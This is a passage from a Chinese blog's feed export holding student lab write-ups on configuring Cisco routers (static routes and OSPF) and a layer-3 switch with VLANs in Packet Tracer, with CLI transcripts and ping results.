class="number">.3</span><span class="number">.0</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span> </span><br><span class="line">!</span><br><span class="line">ip flow-<span class="keyword">export</span> version <span class="number">9</span></span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">line con <span class="number">0</span></span><br><span class="line">!</span><br><span class="line">line aux <span class="number">0</span></span><br><span class="line">!</span><br><span class="line">line vty <span class="number">0</span> <span class="number">4</span></span><br><span class="line"> login</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>同样也需要在R2上配置到PC0的路由</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Router(config)#ip route <span class="number">192.168</span><span class="number">.2</span><span class="number">.0</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><p>从PC0 ping PC1 尝试</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;ping <span class="number">192.168</span><span class="number">.3</span><span class="number">.2</span></span><br><span class="line"></span><br><span class="line">Pinging <span class="number">192.168</span><span class="number">.3</span><span class="number">.2</span> <span class="keyword">with</span> <span class="number">32</span> bytes <span class="keyword">of</span> data:</span><br><span class="line"></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.3</span><span class="number">.2</span>: bytes=<span class="number">32</span> time=27ms TTL=<span class="number">126</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.3</span><span class="number">.2</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">126</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.3</span><span class="number">.2</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">126</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.3</span><span class="number">.2</span>: bytes=<span class="number">32</span> time=9ms TTL=<span class="number">126</span></span><br><span class="line"></span><br><span class="line">Ping statistics <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.3</span><span class="number">.2</span>:</span><br><span class="line">    Packets: Sent = <span class="number">4</span>, Received = <span class="number">4</span>, Lost = <span class="number">0</span> (<span class="number">0</span>% loss),</span><br><span class="line">Approximate round trip times <span class="keyword">in</span> milli-seconds:</span><br><span class="line">    Minimum = 0ms, Maximum = 27ms, Average = 9ms</span><br><span class="line"></span><br><span class="line"><span class="attr">C</span>:\&gt;</span><br></pre></td></tr></table></figure><h1 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h1><h2 id="路由配置"><a href="#路由配置" class="headerlink" title="路由配置"></a>路由配置</h2><p>给R1进行配置</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Router&gt;en</span><br><span class="line">Router#conf t</span><br><span class="line">Enter configuration commands, one per line.  End <span class="keyword">with</span> CNTL/Z.</span><br><span class="line">Router(config)#int g0/<span class="number">0</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#ip address <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#no sh</span><br><span class="line"></span><br><span class="line">Router(config-<span class="keyword">if</span>)#</span><br><span class="line">%LINK-<span class="number">5</span>-CHANGED: Interface GigabitEthernet0/<span class="number">0</span>, changed state to up</span><br><span class="line"></span><br><span class="line">Router(config-<span class="keyword">if</span>)#</span><br><span class="line">Router(config-<span class="keyword">if</span>)#int g0/<span class="number">1</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#ip address <span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#no sh</span><br><span class="line"></span><br><span class="line">Router(config-<span class="keyword">if</span>)#</span><br><span class="line">%LINK-<span class="number">5</span>-CHANGED: Interface GigabitEthernet0/<span class="number">1</span>, changed state to up</span><br><span class="line"></span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface GigabitEthernet0/<span class="number">1</span>, changed state to up</span><br></pre></td></tr></table></figure><p>给R2进行配置</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Router&gt;en</span><br><span class="line">Router#conf t</span><br><span class="line">Enter configuration commands, one per line.  End <span class="keyword">with</span> CNTL/Z.</span><br><span class="line">Router(config)#int g0/<span class="number">0</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#ip addr <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#no sh</span><br><span class="line"></span><br><span class="line">Router(config-<span class="keyword">if</span>)#</span><br><span class="line">%LINK-<span class="number">5</span>-CHANGED: Interface GigabitEthernet0/<span class="number">0</span>, changed state to up</span><br><span class="line"></span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface GigabitEthernet0/<span class="number">0</span>, changed state to up</span><br><span class="line"></span><br><span class="line">Router(config-<span class="keyword">if</span>)#int g0/<span class="number">1</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#ip addr <span class="number">192.168</span><span class="number">.3</span><span class="number">.1</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#no sh</span><br><span class="line"></span><br><span class="line">Router(config-<span class="keyword">if</span>)#</span><br><span class="line">%LINK-<span class="number">5</span>-CHANGED: Interface GigabitEthernet0/<span class="number">1</span>, changed state to up</span><br><span class="line"></span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface GigabitEthernet0/<span class="number">1</span>, changed state to up</span><br></pre></td></tr></table></figure><p>并给两个PC配置 192.168.2.2 与 192.168.3.2</p><h2 id="路由协议"><a href="#路由协议" class="headerlink" title="路由协议"></a>路由协议</h2><p>在两台路由器上启用ospf协议并公布自己的直连网段</p><p>在R1上配置</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Router#conf t</span><br><span class="line">Enter configuration commands, one per line.  End <span class="keyword">with</span> CNTL/Z.</span><br><span class="line">Router(config)#route ospf <span class="number">1</span></span><br><span class="line">Router(config-router)#network <span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.255</span> area <span class="number">0</span></span><br><span class="line">Router(config-router)#network <span class="number">192.168</span><span class="number">.2</span><span class="number">.0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.255</span> area <span class="number">1</span></span><br><span class="line">Router(config-router)#</span><br></pre></td></tr></table></figure><p>在R2上配置</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Router(config)#route ospf <span class="number">1</span></span><br><span class="line">Router(config-router)#network <span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span> area <span class="number">0</span></span><br><span class="line">Router(config-router)#network <span class="number">192.168</span><span class="number">.3</span><span class="number">.0</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span> area <span class="number">0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">11</span>:<span class="number">30</span>: %OSPF-<span class="number">5</span>-ADJCHG: Process <span class="number">1</span>, Nbr <span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span> on GigabitEthernet0/<span class="number">0</span> <span class="keyword">from</span> LOADING to FULL, Loading Done2</span><br><span class="line">Router(config-router)#</span><br></pre></td></tr></table></figure><p>查看do show run内容</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">Router(config-router)#<span class="keyword">do</span> show run</span><br><span class="line">Building configuration...</span><br><span class="line"></span><br><span class="line">Current configuration : <span class="number">751</span> bytes</span><br><span class="line">!</span><br><span class="line">version <span class="number">15.1</span></span><br><span class="line">no service timestamps log datetime msec</span><br><span class="line">no service timestamps debug datetime msec</span><br><span class="line">no service password-encryption</span><br><span class="line">!</span><br><span class="line">hostname Router</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">ip cef</span><br><span class="line">no ipv6 cef</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">license udi pid CISCO1941/K9 sn FTX15246BJO-</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">spanning-tree mode pvst</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">interface GigabitEthernet0/<span class="number">0</span></span><br><span class="line"> ip address <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line"> duplex auto</span><br><span class="line"> speed auto</span><br><span class="line">!</span><br><span class="line">interface GigabitEthernet0/<span class="number">1</span></span><br><span class="line"> ip address <span class="number">192.168</span><span class="number">.3</span><span class="number">.1</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line"> duplex auto</span><br><span class="line"> speed auto</span><br><span class="line">!</span><br><span class="line">interface Vlan1</span><br><span class="line"> no ip address</span><br><span class="line"> shutdown</span><br><span class="line">!</span><br><span class="line">router ospf <span class="number">1</span></span><br><span class="line"> log-adjacency-changes</span><br><span class="line"> network <span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.255</span> area <span class="number">0</span></span><br><span class="line"> network <span class="number">192.168</span><span class="number">.3</span><span class="number">.0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.255</span> area <span class="number">2</span></span><br><span class="line">!</span><br><span class="line">ip classless</span><br><span class="line">!</span><br><span class="line">ip flow-<span class="keyword">export</span> version <span class="number">9</span></span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">line con <span class="number">0</span></span><br><span class="line">!</span><br><span class="line">line aux <span class="number">0</span></span><br><span class="line">!</span><br><span class="line">line vty <span class="number">0</span> <span class="number">4</span></span><br><span class="line"> login</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">Router(config-router)#</span><br></pre></td></tr></table></figure><p>尝试ping另一台PC</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;ping <span class="number">192.168</span><span class="number">.3</span><span class="number">.2</span></span><br><span class="line"></span><br><span class="line">Pinging <span class="number">192.168</span><span class="number">.3</span><span class="number">.2</span> <span class="keyword">with</span> <span class="number">32</span> bytes <span class="keyword">of</span> data:</span><br><span class="line"></span><br><span class="line">Request timed out.</span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.3</span><span class="number">.2</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">126</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.3</span><span class="number">.2</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">126</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.3</span><span class="number">.2</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">126</span></span><br><span class="line"></span><br><span class="line">Ping statistics <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.3</span><span class="number">.2</span>:</span><br><span class="line">    Packets: Sent = <span class="number">4</span>, Received = <span class="number">3</span>, Lost = <span class="number">1</span> (<span class="number">25</span>% loss),</span><br><span class="line">Approximate round trip times <span class="keyword">in</span> milli-seconds:</span><br><span class="line">    Minimum = 0ms, Maximum = 0ms, Average = 0ms</span><br><span class="line"></span><br><span class="line"><span class="attr">C</span>:\&gt;</span><br></pre></td></tr></table></figure><p>在R1上查看邻居</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Router#show ip ospf ne</span><br><span class="line"></span><br><span class="line">Neighbor ID     Pri   State           Dead Time   Address         Interface</span><br><span class="line"><span class="number">192.168</span><span class="number">.3</span><span class="number">.1</span>       <span class="number">1</span>   FULL/BDR        <span class="number">00</span>:<span class="number">00</span>:<span class="number">35</span>    <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span>     GigabitEthernet0/<span class="number">0</span></span><br><span class="line">Router#</span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>该篇实验参照自《计算机网络实验指导书—20190220.pdf》与配套视频。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;准备&quot;&gt;&lt;a href=&quot;#准备&quot; class=&quot;headerlink&quot; title=&quot;准备&quot;&gt;&lt;/a&gt;准备&lt;/h1&gt;&lt;p&gt;路由器基本配置可分为静态路由配置和动态路由配置&lt;/p&gt;
&lt;p&gt;两台路由互相连接，并将路由器连接至PC机，路由器之间配置192.168.1.0/24 网段，路由器1与PC1配置192.168.2.0/24网段，路由器2与PC2配置192.168.3.0/24网段&lt;/p&gt;
&lt;p&gt;路由器选择1941进行。&lt;/p&gt;
&lt;p&gt;使用 Copper Cross-over 连接所有设备，将路由器的0/1口与PC网口相连，路由器0/0口与另一个路由器相连。&lt;/p&gt;
&lt;p&gt;更改名称便于区分，将Router0改为R1，将Router1改为R2&lt;/p&gt;</summary>
    
    
    
    <category term="技术篇" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    <category term="计算机网络原理" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/"/>
    
    <category term="学习" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="实验" scheme="https://guo.moe/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络原理实验三──三层交换机基本配置</title>
    <link href="https://guo.moe/archives/Principles-Of-Computer-Networks-Experiment-3.html"/>
    <id>https://guo.moe/archives/Principles-Of-Computer-Networks-Experiment-3.html</id>
    <published>2021-04-23T10:00:00.000Z</published>
    <updated>2021-04-23T11:35:32.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>在 Switch 中拖入 3560-24PS ，放入两个PC机，并在Connections中选择Copper Straight-Through连接Switch的GigabitEthernet 0/1、0/2和两台PC机的FastEthernet 0。</p><span id="more"></span><h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><h2 id="划分vlan"><a href="#划分vlan" class="headerlink" title="划分vlan"></a>划分vlan</h2><p><strong>给vlan配置地址</strong></p><p>双击进入其中一台 Switch 中，为vlan10添加192.168.20.254地址</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Switch#en</span><br><span class="line">Switch#conf </span><br><span class="line">Configuring <span class="keyword">from</span> terminal, memory, or network [terminal]? </span><br><span class="line">Enter configuration commands, one per line.  End <span class="keyword">with</span> CNTL/Z.</span><br><span class="line">Switch(config)#interface vlan <span class="number">10</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#</span><br><span class="line">%LINK-<span class="number">5</span>-CHANGED: Interface Vlan10, changed state to up</span><br><span class="line"></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#ip address <span class="number">192.168</span><span class="number">.10</span><span class="number">.254</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#no sh</span><br><span class="line">Switch(config-<span class="keyword">if</span>)#</span><br></pre></td></tr></table></figure><p>添加出错后，可为vlan10删除该地址</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Switch(config-<span class="keyword">if</span>)#int vlan <span class="number">10</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#no ip addre</span><br><span class="line">Switch(config-<span class="keyword">if</span>)#no ip address <span class="number">192.168</span><span class="number">.10</span><span class="number">.254</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#</span><br></pre></td></tr></table></figure><p>或者直接添加新的覆盖</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Switch(config-<span class="keyword">if</span>)#ip address <span class="number">192.168</span><span class="number">.10</span><span class="number">.254</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><p>用同样的方法，给vlan20添加192.168.20.254 的ip</p><h2 id="给接口配置vlan"><a href="#给接口配置vlan" class="headerlink" title="给接口配置vlan"></a>给接口配置vlan</h2><p>进入gb0/1与gb0/2，分别给两个接口分配vlan10与vlan20</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#interface gigabitEthernet <span class="number">0</span>/<span class="number">1</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#switchport access vlan <span class="number">10</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#</span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface Vlan10, changed state to up</span><br><span class="line"></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#exit</span><br><span class="line">Switch(config)#inte</span><br><span class="line">Switch(config)#interface gi</span><br><span class="line">Switch(config)#interface gigabitEthernet <span class="number">0</span>/<span class="number">2</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#switc</span><br><span class="line">Switch(config-<span class="keyword">if</span>)#switchport acc</span><br><span class="line">Switch(config-<span class="keyword">if</span>)#switchport access vlan <span class="number">20</span></span><br><span class="line">% Access VLAN does not exist. Creating vlan <span class="number">20</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#</span><br><span class="line">%LINK-<span class="number">5</span>-CHANGED: Interface Vlan20, changed state to up</span><br><span class="line"></span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface Vlan20, changed state to up</span><br><span class="line"></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#</span><br></pre></td></tr></table></figure><h2 id="给PC配置IP"><a href="#给PC配置IP" class="headerlink" title="给PC配置IP"></a>给PC配置IP</h2><p>给划分在vlan10上的PC机进行IP配置，IP地址设为192.168.10.1，Gateway设为192.168.10.254，另一台同理。</p><p>此时使用一台PC机ping另一台PC机，发现不通，但是ping 192.168.20.254是通的，这是因为交换机目前还没有路由功能。在交换机上输入</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#ip routing</span><br></pre></td></tr></table></figure><p>这时候就有三层交换机的路由功能了。</p><p>这时候就可以ping通了</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;ping <span class="number">192.168</span><span class="number">.20</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">Pinging <span class="number">192.168</span><span class="number">.20</span><span class="number">.1</span> <span class="keyword">with</span> <span class="number">32</span> bytes <span class="keyword">of</span> data:</span><br><span class="line"></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.20</span><span class="number">.1</span>: bytes=<span class="number">32</span> time=1ms TTL=<span class="number">127</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.20</span><span class="number">.1</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">127</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.20</span><span class="number">.1</span>: bytes=<span class="number">32</span> time=6ms TTL=<span class="number">127</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.20</span><span class="number">.1</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">127</span></span><br><span class="line"></span><br><span class="line">Ping statistics <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.20</span><span class="number">.1</span>:</span><br><span class="line">    Packets: Sent = <span class="number">4</span>, Received = <span class="number">4</span>, Lost = <span class="number">0</span> (<span class="number">0</span>% loss),</span><br><span class="line">Approximate round trip times <span class="keyword">in</span> milli-seconds:</span><br><span class="line">    Minimum = 0ms, Maximum = 6ms, Average = 1ms</span><br></pre></td></tr></table></figure><h2 id="不划分vlan的交换机配置"><a href="#不划分vlan的交换机配置" class="headerlink" title="不划分vlan的交换机配置"></a>不划分vlan的交换机配置</h2><p><strong>给接口配置地址</strong></p><p>不划分vlan的时候</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Switch#conf t</span><br><span class="line">Enter configuration commands, one per line.  End <span class="keyword">with</span> CNTL/Z.</span><br><span class="line">Switch(config)#int g0/<span class="number">1</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#no swi</span><br><span class="line">Switch(config-<span class="keyword">if</span>)#no switchport </span><br><span class="line">Switch(config-<span class="keyword">if</span>)#</span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface GigabitEthernet0/<span class="number">1</span>, changed state to down</span><br><span class="line"></span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface GigabitEthernet0/<span class="number">1</span>, changed state to up</span><br><span class="line"></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#ip add</span><br><span class="line">Switch(config-<span class="keyword">if</span>)#ip address <span class="number">192.168</span><span class="number">.10</span><span class="number">.254</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#no sh</span><br><span class="line">Switch(config-<span class="keyword">if</span>)#int g0/<span class="number">2</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#no sw</span><br><span class="line">Switch(config-<span class="keyword">if</span>)#no switchport </span><br><span class="line">Switch(config-<span class="keyword">if</span>)#</span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface GigabitEthernet0/<span class="number">2</span>, changed state to down</span><br><span class="line"></span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface GigabitEthernet0/<span class="number">2</span>, changed state to up</span><br><span class="line"></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#ip add</span><br><span class="line">Switch(config-<span class="keyword">if</span>)#ip address <span class="number">192.168</span><span class="number">.20</span><span class="number">.254</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#</span><br></pre></td></tr></table></figure><p>并给两台主机分别配置 192.168.10.1 和 192.168.20.1的ip，在 Switch 中输入</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Switch#conf t</span><br><span class="line">Enter configuration commands, one per line.  End <span class="keyword">with</span> CNTL/Z.</span><br><span class="line">Switch(config)#ip routing</span><br><span class="line">Switch(config)#</span><br></pre></td></tr></table></figure><p>在第一台PC机中输入 ping 